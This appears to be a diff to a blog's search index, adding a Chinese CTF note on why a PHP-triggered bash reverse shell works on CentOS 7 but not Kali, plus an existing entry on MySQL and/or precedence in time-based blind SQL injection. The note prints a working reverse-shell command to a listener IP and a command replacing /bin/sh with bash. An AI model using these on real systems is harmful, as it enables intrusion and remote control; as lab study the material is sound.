@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[关于Centos与Ubuntu使用php反弹shell结果不同的问题]]></title>
+    <url>%2F2019%2F01%2F15%2Freverse-shell-diff%2F</url>
+    <content type="text"><![CDATA[在复现一个CTF题时，上传上去了一句话木马，但是不允许用菜刀连接，所以我是想vps上监听一个端口，然后直接用hackbar反弹shell，结果死活反弹不回来。而在我印象中是有直接使用hackbar反弹shell成功的前例。因而有了此篇文章。刚开始是在kali上测试的，也是死活谈不回来 正常的反弹命令：bash -i &gt;&amp;/dev/tcp/192.168.1.103/123 0&gt;&amp;1然后由于是在post中，所以需要给&amp;编码，变成%26，可是还是弹不回来？？？ 后来试着在kali终端中直接执行这条命令，没问题，能弹回来 然后写了一个php脚本，内容如下： 然后，执行该脚本，他丫的居然报错了？？？ 我去？什么鬼？ 后来在Centos7中创建了同样的一个脚本，执行得到如下结果： 这个为啥就成功弹回来了？？？不科学伐！！！ 经过测试得到，Centos7中可以弹回shell，而kali就是不行！！！ 后来网上搜索了一下解决方法，是因为ubuntu从6.10开始，默认使用dash（登录还是用bash），因为dash更快更高效。只要把bash链接到sh即可。。。 可以看到kali中确实sh默认是链接的dash 将bash链接到sh后，再次执行该脚本 12mv /bin/sh /bin/sh.origln -s /bin/bash /bin/sh 然后就可以成功的弹回shell了]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
+      <tags>
+        <tag>杂记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[延时盲注关于优先级的发现]]></title>
     <url>%2F2019%2F01%2F13%2Fmysql-sleep-and-or%2F</url>
     <content type="text"><![CDATA[今天朋友问我，使用and 和or 进行延时注入会返回不同的结果。我思索了一下，貌似确实有这么个印象。回家后又总结了下关于 and 与 or 进行延时盲注时的不同。 延时盲注关于优先级的发现下面看例子 当使用and进行连接时，第一条执行了sleep(1)函数，而第二条没有执行sleep(1)函数 当使用or进行连接时，第一条没有执行sleep(1)，而第二条执行了sleep(1)，与and的结论是相反的。 经过上网查询并经自己测试之后，发现mysql的查询相关策略（可能有误，欢迎指正）： mysql执行顺序为从左到右 在select后，多个and中，如果左侧有恒为0的值，则直接返回0，不执行同级右侧的其他语句。在where后，多个and中，如果两侧有恒为0的值，则直接返回0 在select后，多个or连接的语句中如果左侧有值恒为1，则直接返回1，不执行同级右侧的其他语句。在where后，多个or连接的语句如果两侧有值恒为1，则直接返回1。 and优先级大于or 在select后，当既有and又有or时，将and及其左右连接的值看做一个整体（两侧加小括号，因为and优先级比or高）。若处理后or左侧连接的值为恒为1，则直接返回1，不执行右侧内容 在where后，若and和or同时出现，将and两侧连接的数值看成一个整体，先检查or两侧是否有直接连接恒为1的值，若有，直接返回1，若没有，再从左到右依次进行计算。 最后附一张mysql运算符的优先级 参考链接1 参考链接2]]></content>
